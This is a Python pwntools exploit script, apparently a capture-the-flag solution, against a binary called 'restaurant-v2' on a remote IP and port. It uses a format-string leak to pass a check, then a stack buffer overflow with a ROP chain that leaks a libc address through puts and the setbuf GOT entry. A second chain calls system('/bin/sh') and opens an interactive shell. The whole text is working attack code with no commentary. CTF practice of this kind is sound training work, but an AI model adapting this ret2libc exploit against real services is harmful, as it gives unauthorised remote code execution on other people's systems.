from pwn import *
context.log_level = 'debug'
context.arch = "amd64"

e = context.binary = ELF('restaurant-v2')
# r= e.process()
r = remote('34.89.137.65',31565)
# lib = e.libc
lib= ELF('libc-2.27.so')

main=0x0000000000400996
pop_rdi_ret=0x0000000000400b33
ret=pop_rdi_ret+1
setbuf_got = 0x602020
puts_plt = 0x4006c0

r.sendline(b"%9$p")
r.recvuntil(b"0x")
leak = int(r.recv(9),16)&0xffffffff
log.info("leak: %#x" %leak)
r.sendlineafter(b"to pass: ",hex(leak))
pause()
r.sendline(b"3")
payload = b"a"*0x70+b"b"*8
payload+= flat(pop_rdi_ret, setbuf_got, puts_plt, main)
pause()
r.sendlineafter(b"eat:",payload)
# r.recvline()

setbuf_libc = u64(r.recv(6).ljust(8,b"\x00")) 
log.info("setbuf_libc: %#x" %setbuf_libc)
base_libc = setbuf_libc - lib.sym.setbuf
system_libc = base_libc + lib.sym.system
binsh_libc = base_libc + next(lib.search(b"/bin/sh"))
log.info("base_libc: %#x" %base_libc)
log.info("system_libc: %#x" %system_libc)
log.info("binsh_libc: %#x" %binsh_libc)

r.sendline(b"%9$p")
r.recvuntil(b"0x")
leak = int(r.recv(9),16)&0xffffffff
log.info("leak: %#x" %leak)
r.sendlineafter(b"to pass: ",hex(leak))
r.sendlineafter(b">> ",b"3")
payload = b"a"*0x70+b"b"*8
payload+= flat(ret, pop_rdi_ret, binsh_libc, system_libc, main)
pause()
r.sendlineafter(b"eat:",payload)

r.interactive()
